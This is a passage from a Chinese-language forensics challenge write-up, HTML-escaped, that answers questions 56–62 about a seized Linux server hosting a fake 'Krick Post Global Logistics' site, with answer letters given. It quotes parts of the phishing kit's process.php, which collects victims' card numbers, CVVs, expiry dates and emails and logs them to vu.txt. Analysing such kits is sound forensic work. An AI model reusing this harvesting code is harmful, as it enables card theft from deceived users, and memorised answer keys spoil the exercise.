&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;ALLOWED_USERS&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;+=(&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$u&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;实际可登录 FTP 用户:&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;${#&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;ALLOWED_USERS&lt;/span&gt;[@]&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt; -eq &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#c678dd&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;无用户可登录&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e5c07b&#34;&gt;printf&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;%s\n&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;ALLOWED_USERS&lt;/span&gt;[@]&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$ANONYMOUS_ENABLE&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;YES&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;匿名用户可登录&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们保存为test.sh，给他添加执行权限：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod +x test.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./test.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815201713295&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815201713295.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815201713295.png&#34; alt=&#34;image-20250815201713295&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;一共两个，其中只有ftpuser符合题目选项&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;57虚拟机设置了什么网页服务器web-server&#34;&gt;57.虚拟机设置了什么网页服务器(Web Server)?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. NGINX&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. LIGHTTPD&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. WORDPRESS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. APACHE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E. IIS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;直接在火眼里就能分析，明面上的有apache和nginx，docker容器里面还有一个nginx，再没别的了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815202026740&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815202026740.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815202026740.png&#34; alt=&#34;image-20250815202026740&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AD
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;*做到后面回来看，会发现其实真正只有一个 ——  docker的nginx是可以使用的，本机无法检测到nginx和apache，所以这一题真正应该是只nginx：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;*再次更正，其实是有apache的，只不过服务名称是apache2，所以答案还是：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;AD
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;58网页服务器目录内有图片档案而此档案的储存位置是&#34;&gt;58.网页服务器目录内有图片档案，而此档案的储存位置是?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. /var/www/html/post/src&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. /var/www/html/post/css&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. /var/www/html/post/vendor&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. /var/www/post&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;没有tree命令，我们使用ls查看一下/var/www：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ls -R -1 /var/www
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在/var/www/html/post/css下发现.png文件：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815202445751&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815202445751.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815202445751.png&#34; alt=&#34;image-20250815202445751&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;B
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;59分析网页服务器的网站数据假网站的公司名称是什么&#34;&gt;59.分析网页服务器的网站数据，假网站的公司名称是什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. Krick Global Logistics&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. Global Logistics&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. Krick Post Global Logistics&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. Krick Post&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一开始我以为火眼分析的apache是错的，因为除了一条空的站点信息啥也没有，但点进去才发现原来这是apache的配置文件，这台服务器上搭载了的是apache2&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815204505809&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815204505809.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815204505809.png&#34; alt=&#34;image-20250815204505809&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;其实在上一题就应该意识到了，因为本机没有nginx，却有/var/www目录&lt;/p&gt;
&lt;p&gt;在配置文件里面也能够找到网站页面存放的位置：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815204556092&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815204556092.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815204556092.png&#34; alt=&#34;image-20250815204556092&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;那么同上题图，就可以知道一共有html和post两个页面&lt;/p&gt;
&lt;p&gt;服务器的apache2已经打开了，直接访问一下，发现html访问不了，只有post有用：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815205105858&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815205105858.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815205105858.png&#34; alt=&#34;image-20250815205105858&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不要忽略了Krick Post下还有一行小字Global Logistics&lt;/p&gt;
&lt;h2 id=&#34;60检视假网站首页的显示ay806369745hk-代表什么&#34;&gt;60.检视假网站首页的显示，AY806369745HK 代表什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 邮件号码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 邮件收费号码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 邮件序号&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 邮件参考号码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;同上题图：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;61分析假网站的资料当受害人经假网站输入数据后网站会产生一个档案它的档案名是什么不要输入以大写英文及阿拉数字回答如-cat10jpg需回答cat10jpg&#34;&gt;61.分析假网站的资料，当受害人经假网站输入数据后，网站会产生一个档案，它的档案名是什么?(不要输入“，以大写英文及阿拉数字回答。如 Cat10.jpg，需回答CAT10JPG)
&lt;/h2&gt;&lt;p&gt;查看网站介绍界面/var/www/html/post/index.php，发现这个表单提交数据的方式是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;align&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;center&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;process.php&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Customerinfo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;表单会提交到process.php进行文件处理，也就是说档案名取决于process.php内部的实现&lt;/p&gt;
&lt;p&gt;这个文件也在index.php同级，查看可以看到提交的数据会被写入一个固定的文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$resultFile&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;vu.txt&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;fopen&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$resultFile&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Date &amp;amp; Time: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$dateTime&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Card Holder: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$holdername&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Card no.: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$cardno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;cvv: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$cvv&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;expire date: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$exp_mth&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$exp_yr&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Email: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$email&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;@&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$email_domn&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Browser Info: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$browser&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#7f848e&#34;&gt;//End of Entry
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fclose&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也就是说档案名是固定的&lt;code&gt;vu.txt&lt;/code&gt;，我们也见过，这个文件也在index.php同级&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;VUTXT
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;62分析假网站档案processphp-源码source-code推测此档案的用途可能是&#34;&gt;62.分析假网站档案，process.php&amp;rsquo; 源码(Source Code),推测此档案的用途可能是?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 改变函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 产生档案&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 发出邮件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 更新数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;依旧process.php：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;// 从 POST 获取受害人提交的数据
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$holdername&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;holdername&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$cardno&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;cardno&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$cvv&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;cvv&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$exp_mth&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;exp_mth&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$exp_yr&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;exp_yr&amp;#34;&lt;/span&gt;];
